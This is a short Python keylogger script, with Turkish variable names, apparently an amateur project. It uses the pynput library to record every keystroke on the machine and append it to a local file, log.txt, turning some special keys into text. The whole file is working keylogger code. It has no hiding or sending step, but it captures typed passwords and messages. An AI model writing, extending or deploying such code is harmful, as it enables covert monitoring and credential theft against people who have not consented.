from pynput.keyboard import Listener

def write_to_file(key):
    yazi = str(key)
    yazi = yazi.replace("'","")

    if yazi == "Key.space":
        yazi = ' '
    if yazi == "Key.shift_r":
        yazi = ''
    if yazi=="Key.backspace":
        yazi = 'delet'
    if yazi == "Key.ctrl_l":
        yazi = ""
    if yazi == "Key.enter":
        yazi = "\n"
    if yazi == "Key.shift2":
        yazi = "@"

    with open("log.txt","a") as f:
        f.write(yazi)
with Listener(on_press=write_to_file) as l:
    l.join()
